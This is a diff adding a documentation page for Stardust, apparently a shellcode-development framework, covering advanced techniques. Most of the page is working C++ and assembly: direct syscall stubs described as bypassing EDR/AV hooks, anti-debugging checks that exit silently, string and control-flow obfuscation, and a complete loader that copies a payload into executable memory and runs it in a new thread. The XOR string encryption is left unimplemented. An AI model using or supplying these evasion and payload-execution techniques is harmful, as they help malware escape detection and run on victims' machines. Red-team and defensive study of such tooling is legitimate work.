@@ -1,0 +1,551 @@
+---
+title: 'Advanced Techniques'
+description: 'Advanced shellcode techniques for memory, syscalls, anti-analysis, and optimization'
+icon: 'wand-magic-sparkles'
+---
+
+## Overview
+
+This guide covers advanced techniques for developing sophisticated, stealthy, and optimized position-independent shellcode using Stardust.
+
+## Custom Memory Allocation Patterns
+
+### Using High-Level APIs
+
+Stardust's kernel32 integration provides standard memory allocation:
+
+```cpp
+// Add to kernel32 struct in include/common.h
+struct {
+    uintptr_t handle;
+    struct {
+        D_API( LoadLibraryA )
+        D_API( GetProcAddress )
+        D_API( VirtualAlloc )
+        D_API( VirtualFree )
+        D_API( VirtualProtect )
+    };
+} kernel32 = {
+    RESOLVE_TYPE( LoadLibraryA ),
+    RESOLVE_TYPE( GetProcAddress ),
+    RESOLVE_TYPE( VirtualAlloc ),
+    RESOLVE_TYPE( VirtualFree ),
+    RESOLVE_TYPE( VirtualProtect )
+};
+```
+
+**Usage:**
+```cpp
+auto declfn instance::start(_In_ void* arg) -> void {
+    // Allocate RWX memory
+    auto buffer = kernel32.VirtualAlloc(
+        nullptr,
+        0x1000,
+        MEM_COMMIT | MEM_RESERVE,
+        PAGE_EXECUTE_READWRITE
+    );
+
+    if (!buffer) {
+        DBG_PRINTF("VirtualAlloc failed\n");
+        return;
+    }
+
+    // Use the buffer...
+    memory::copy(buffer, some_data, size);
+
+    // Free when done
+    kernel32.VirtualFree(buffer, 0, MEM_RELEASE);
+}
+```
+
+### Using Low-Level Syscalls
+
+For more stealth, bypass user-mode hooks by calling ntdll directly:
+
+```cpp
+// Add to ntdll struct
+struct {
+    uintptr_t handle;
+    struct {
+        D_API( NtAllocateVirtualMemory )
+        D_API( NtProtectVirtualMemory )
+        D_API( NtFreeVirtualMemory )
+    };
+} ntdll = {
+    RESOLVE_TYPE( NtAllocateVirtualMemory ),
+    RESOLVE_TYPE( NtProtectVirtualMemory ),
+    RESOLVE_TYPE( NtFreeVirtualMemory )
+};
+```
+
+**Implementation:**
+```cpp
+auto allocate_memory(SIZE_T size) -> PVOID {
+    PVOID base_address = nullptr;
+    SIZE_T region_size = size;
+
+    NTSTATUS status = ntdll.NtAllocateVirtualMemory(
+        reinterpret_cast<HANDLE>(-1), // Current process
+        &base_address,
+        0,
+        &region_size,
+        MEM_COMMIT | MEM_RESERVE,
+        PAGE_READWRITE
+    );
+
+    if (status != 0) { // NT_SUCCESS
+        DBG_PRINTF("NtAllocateVirtualMemory failed: 0x%X\n", status);
+        return nullptr;
+    }
+
+    DBG_PRINTF("Allocated %d bytes at %p\n", region_size, base_address);
+    return base_address;
+}
+
+auto protect_memory(PVOID address, SIZE_T size, ULONG protection) -> bool {
+    SIZE_T region_size = size;
+    ULONG old_protection;
+
+    NTSTATUS status = ntdll.NtProtectVirtualMemory(
+        reinterpret_cast<HANDLE>(-1),
+        &address,
+        &region_size,
+        protection,
+        &old_protection
+    );
+
+    return status == 0;
+}
+```
+
+### Memory Utility Functions
+
+Stardust includes position-independent memory utilities:
+
+```cpp include/memory.h
+namespace memory {
+    // Secure zero memory
+    inline auto zero(_Inout_ void* memory, _In_ uint32_t length) -> void {
+        RtlSecureZeroMemory(memory, length);
+    }
+
+    // Copy memory
+    inline auto copy(_Out_ void* destination, _In_ void* source, _In_ uint32_t length) -> void* {
+        for (size_t i = 0; i < length; i++) {
+            static_cast<uint8_t*>(destination)[i] = static_cast<uint8_t*>(source)[i];
+        };
+        return destination;
+    }
+
+    // Compare memory
+    inline auto compare(_In_ void* memory1, _In_ void* memory2, _In_ uintptr_t length) -> uint32_t {
+        auto a = static_cast<char*>(memory1);
+        auto b = static_cast<char*>(memory2);
+
+        do {
+            if (*a++ != *b++) {
+                return (*--a - *--b);
+            };
+        } while(--length != 0);
+
+        return 0;
+    }
+}
+```
+
+**Usage example:**
+```cpp
+// Copy shellcode to new buffer
+auto new_buffer = allocate_memory(base.length);
+if (new_buffer) {
+    memory::copy(new_buffer, reinterpret_cast<void*>(base.address), base.length);
+    
+    // Protect as RX
+    protect_memory(new_buffer, base.length, PAGE_EXECUTE_READ);
+}
+
+// Secure cleanup
+memory::zero(sensitive_data, sizeof(sensitive_data));
+```
+
+## Direct Syscall Execution
+
+### Why Use Syscalls?
+
+- **Bypass user-mode hooks**: EDR/AV solutions hook ntdll and kernel32
+- **Stealth**: Direct kernel interaction
+- **Stability**: Avoid hooked function trampolines
+
+### Syscall Stub Generation
+
+For x64 Windows, syscalls follow this pattern:
+
+```asm
+MOV R10, RCX        ; Save RCX to R10
+MOV EAX, <syscall_number>
+SYSCALL
+RET
+```
+
+**Implementation:**
+```cpp
+// Syscall stub structure
+struct SyscallStub {
+    uint8_t mov_r10_rcx[3];   // 4C 8B D1
+    uint8_t mov_eax[1];       // B8
+    uint32_t syscall_number;  // Variable
+    uint8_t syscall[2];       // 0F 05
+    uint8_t ret;              // C3
+};
+
+auto create_syscall_stub(uint32_t syscall_number) -> SyscallStub* {
+    auto stub = static_cast<SyscallStub*>(
+        kernel32.VirtualAlloc(nullptr, sizeof(SyscallStub), 
+                             MEM_COMMIT | MEM_RESERVE, 
+                             PAGE_EXECUTE_READWRITE)
+    );
+
+    if (!stub) return nullptr;
+
+    // MOV R10, RCX
+    stub->mov_r10_rcx[0] = 0x4C;
+    stub->mov_r10_rcx[1] = 0x8B;
+    stub->mov_r10_rcx[2] = 0xD1;
+    
+    // MOV EAX, syscall_number
+    stub->mov_eax[0] = 0xB8;
+    stub->syscall_number = syscall_number;
+    
+    // SYSCALL
+    stub->syscall[0] = 0x0F;
+    stub->syscall[1] = 0x05;
+    
+    // RET
+    stub->ret = 0xC3;
+
+    return stub;
+}
+
+// Usage
+typedef NTSTATUS(NTAPI* pNtAllocateVirtualMemory)(
+    HANDLE ProcessHandle,
+    PVOID* BaseAddress,
+    ULONG_PTR ZeroBits,
+    PSIZE_T RegionSize,
+    ULONG AllocationType,
+    ULONG Protect
+);
+
+auto syscall_allocate = reinterpret_cast<pNtAllocateVirtualMemory>(
+    create_syscall_stub(0x18) // NtAllocateVirtualMemory syscall number
+);
+```
+
+**Note**: Syscall numbers vary by Windows version. Consider:
+- Parsing ntdll to extract syscall numbers dynamically
+- Using a version-specific lookup table
+- Implementing syscall number resolution at runtime
+
+## Anti-Debugging Techniques
+
+### PEB Checks
+
+```cpp
+// Check BeingDebugged flag
+auto is_debugger_present() -> bool {
+    return NtCurrentPeb()->BeingDebugged;
+}
+
+// Check NtGlobalFlag
+auto check_nt_global_flag() -> bool {
+    // Offset differs between x86 and x64
+#ifdef _M_X64
+    auto nt_global_flag = *reinterpret_cast<DWORD*>(
+        reinterpret_cast<BYTE*>(NtCurrentPeb()) + 0xBC
+    );
+#else
+    auto nt_global_flag = *reinterpret_cast<DWORD*>(
+        reinterpret_cast<BYTE*>(NtCurrentPeb()) + 0x68
+    );
+#endif
+
+    // Check for heap flags set during debugging
+    return (nt_global_flag & 0x70) != 0;
+}
+```
+
+### Timing Checks
+
+```cpp
+// Add to kernel32 struct
+D_API( GetTickCount )
+D_API( Sleep )
+
+auto detect_debugger_timing() -> bool {
+    auto start = kernel32.GetTickCount();
+    kernel32.Sleep(1000);
+    auto end = kernel32.GetTickCount();
+
+    // If more than 1500ms elapsed, likely debugged
+    return (end - start) > 1500;
+}
+```
+
+### Anti-Analysis Integration
+
+```cpp
+auto declfn instance::start(_In_ void* arg) -> void {
+    // Perform anti-debugging checks
+    if (is_debugger_present()) {
+        DBG_PRINTF("Debugger detected via PEB\n");
+        return; // Or execute decoy behavior
+    }
+
+    if (check_nt_global_flag()) {
+        DBG_PRINTF("Debugger detected via NtGlobalFlag\n");
+        return;
+    }
+
+    if (detect_debugger_timing()) {
+        DBG_PRINTF("Debugger detected via timing\n");
+        return;
+    }
+
+    // Continue with actual payload...
+}
+```
+
+## Optimizing Shellcode Size
+
+### 1. Use Compiler Optimizations
+
+Modify `Makefile`:
+```makefile
+CXXFLAGS = -Os              # Optimize for size
+LDFLAGS  = --gc-sections    # Remove unused sections
+```
+
+### 2. Minimize String Usage
+
+**Before (larger):**
+```cpp
+auto user32 = kernel32.LoadLibraryA(symbol<const char*>("user32.dll"));
+auto msgbox = RESOLVE_API(reinterpret_cast<uintptr_t>(user32), MessageBoxA);
+msgbox(nullptr, symbol<const char*>("This is a very long message that takes up space"),
+               symbol<const char*>("Long Title"), MB_OK);
+```
+
+**After (smaller):**
+```cpp
+auto user32 = kernel32.LoadLibraryA(symbol<const char*>("user32"));
+auto msgbox = RESOLVE_API(reinterpret_cast<uintptr_t>(user32), MessageBoxA);
+msgbox(0, symbol<const char*>("Msg"), symbol<const char*>("T"), 0);
+```
+
+### 3. Reduce Debug Output
+
+Debug builds are significantly larger:
+```bash
+# Release: ~752 bytes
+make
+
+# Debug: ~1200 bytes
+make debug
+```
+
+### 4. Inline Small Functions
+
+```cpp
+// Force inlining of small helpers
+inline __attribute__((always_inline)) 
+auto get_module_handle(const wchar_t* name) -> uintptr_t {
+    return resolve::module(stardust::hash_string<wchar_t>(name));
+}
+```
+
+### 5. Use Conditional Compilation
+
+```cpp
+#ifndef MINIMAL_BUILD
+    DBG_PRINTF("Verbose logging\n");
+    // Additional features
+#endif
+
+// Build with: make CXXFLAGS="-DMINIMAL_BUILD"
+```
+
+## Thread Safety Considerations
+
+### Problem: Multiple Threads
+
+If shellcode spawns threads or is injected into multi-threaded processes:
+
+```cpp
+// Add to kernel32
+D_API( CreateThread )
+D_API( WaitForSingleObject )
+
+auto thread_routine(LPVOID param) -> DWORD {
+    auto inst = static_cast<instance*>(param);
+    
+    // Each thread needs its own context
+    // Careful with shared resources!
+    
+    return 0;
+}
+
+auto declfn instance::start(_In_ void* arg) -> void {
+    HANDLE thread = kernel32.CreateThread(
+        nullptr,
+        0,
+        reinterpret_cast<LPTHREAD_START_ROUTINE>(thread_routine),
+        this,
+        0,
+        nullptr
+    );
+
+    if (thread) {
+        kernel32.WaitForSingleObject(thread, INFINITE);
+    }
+}
+```
+
+### Thread-Safe Module Resolution
+
+The PEB walk is generally safe, but consider:
+
+```cpp
+// Cache module handles - resolve once
+struct ModuleCache {
+    uintptr_t kernel32;
+    uintptr_t ntdll;
+    uintptr_t user32;
+    bool initialized;
+};
+
+static ModuleCache g_modules = {0};
+
+auto init_modules() -> bool {
+    if (g_modules.initialized) {
+        return true; // Already initialized
+    }
+
+    g_modules.kernel32 = resolve::module(
+        expr::hash_string<wchar_t>(L"kernel32.dll")
+    );
+    g_modules.ntdll = resolve::module(
+        expr::hash_string<wchar_t>(L"ntdll.dll")
+    );
+    
+    g_modules.initialized = (g_modules.kernel32 && g_modules.ntdll);
+    return g_modules.initialized;
+}
+```
+
+## Code Obfuscation
+
+### String Encryption
+
+```cpp
+// Simple XOR encryption at compile time
+constexpr auto xor_string(const char* str, size_t len, uint8_t key) {
+    // Implementation left as exercise
+    // Encrypt strings, decrypt at runtime with symbol()
+}
+
+// Usage
+auto encrypted = xor_string("user32.dll", 10, 0xAA);
+auto decrypted = decrypt(encrypted, 10, 0xAA);
+```
+
+### Control Flow Obfuscation
+
+```cpp
+// Add junk code branches
+auto declfn instance::start(_In_ void* arg) -> void {
+    volatile int x = kernel32.GetTickCount() & 1;
+    
+    if (x == 2) { // Never true
+        // Junk code that's never executed
+        kernel32.Sleep(99999);
+    }
+    
+    // Real payload continues...
+}
+```
+
+## Performance Profiling
+
+### Measure Shellcode Execution Time
+
+```cpp
+auto declfn instance::start(_In_ void* arg) -> void {
+    auto start_time = kernel32.GetTickCount();
+    
+    // Your payload...
+    
+    auto end_time = kernel32.GetTickCount();
+    DBG_PRINTF("Execution took %d ms\n", end_time - start_time);
+}
+```
+
+### Memory Footprint
+
+```cpp
+DBG_PRINTF("Shellcode size: %d bytes\n", base.length);
+DBG_PRINTF("Base address: %p\n", base.address);
+```
+
+## Complete Advanced Example
+
+```cpp
+auto declfn instance::start(_In_ void* arg) -> void {
+    // Anti-debugging checks
+    if (is_debugger_present() || check_nt_global_flag()) {
+        return; // Silent exit
+    }
+
+    // Allocate private memory using syscalls
+    auto buffer = allocate_memory(0x1000);
+    if (!buffer) return;
+
+    // Copy payload to new buffer
+    memory::copy(buffer, payload_data, payload_size);
+
+    // Make executable
+    protect_memory(buffer, payload_size, PAGE_EXECUTE_READ);
+
+    // Execute in new thread
+    HANDLE thread = kernel32.CreateThread(
+        nullptr, 0,
+        reinterpret_cast<LPTHREAD_START_ROUTINE>(buffer),
+        nullptr, 0, nullptr
+    );
+
+    if (thread) {
+        kernel32.WaitForSingleObject(thread, INFINITE);
+    }
+
+    // Cleanup
+    memory::zero(buffer, payload_size);
+    ntdll.NtFreeVirtualMemory(
+        reinterpret_cast<HANDLE>(-1),
+        &buffer, &payload_size,
+        MEM_RELEASE
+    );
+}
+```
+
+## Security Considerations
+
+1. **OPSEC**: Every Windows API call creates artifacts
+2. **Memory Protection**: Avoid RWX memory when possible
+3. **String Artifacts**: All strings are embedded in shellcode
+4. **Call Patterns**: API call sequences can be signatured
+5. **Persistence**: Clean up resources to avoid detection
+
+## Next Steps
+
+- Review [Basic MessageBox Example](/examples/basic-messagebox)
+- Learn about [Loading Libraries](/examples/loading-libraries)
+- Explore the [API Reference](/api/resolve)
